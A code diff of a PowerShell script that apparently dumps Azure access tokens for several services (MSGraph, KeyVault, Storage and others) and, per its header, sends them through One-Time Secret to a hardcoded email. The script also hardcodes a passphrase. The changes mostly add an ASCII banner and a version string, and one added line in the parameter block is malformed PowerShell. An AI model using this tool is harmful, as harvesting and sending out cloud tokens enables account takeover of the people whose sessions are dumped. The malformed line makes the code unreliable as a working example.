@@ -27,7 +27,8 @@ Generates access tokens and shares them via One-Time Secret with the specified e
 function AccessToken {
     param (
         $receiptEmail = "r.dijkman@securehats.nl",
-        $passphrase   = "B74ckC@t"
+        $passphrase = "B74ckC@t"
+        v$version '1.0.9'
     )   
     
     if (-not(Get-Module -Name 'Az.Accounts')) {
@@ -42,11 +43,22 @@ function AccessToken {
 
     $resourceTypeNames = @("MSGraph", "ResourceManager", "KeyVault", "Storage", "Synapse", "OperationalInsights", "Batch")
 
-    Set-AzConfig -DisplayBreakingChangeWarning $false
+    $null = Set-AzConfig -DisplayBreakingChangeWarning $false
     try {
         $tokens = @()
 
-        Write-Host "--- Token Dumpr v1.0.8 ---"
+        $logo = @"
+    |     |'''''||     |''||''|         '||                          '||''|.                                        
+   |||        .|'         ||      ...    ||  ..    ....  .. ...       ||   ||  ... ...  .. .. ..   ... ...  ... ..  
+  |  ||      ||           ||    .|  '|.  || .'   .|...||  ||  ||      ||    ||  ||  ||   || || ||   ||'  ||  ||' '' 
+ .''''|.   .|'            ||    ||   ||  ||'|.   ||       ||  ||      ||    ||  ||  ||   || || ||   ||    |  ||     
+.|.  .||. ||......|      .||.    '|..|' .||. ||.  '|...' .||. ||.    .||...|'   '|..'|. .|| || ||.  ||...'  .||.    
+                                                                                                    ||              
+                                                                                                   ''''            
+                                    --- AZ Token Dumpr v$version ---
+"@
+
+        Write-Host $logo
         foreach ($resourceTypeName in $resourceTypeNames) {
             try {
                 $accessToken = (Get-AzAccessToken -ResourceTypeName $resourceTypeName -AsSecureString)
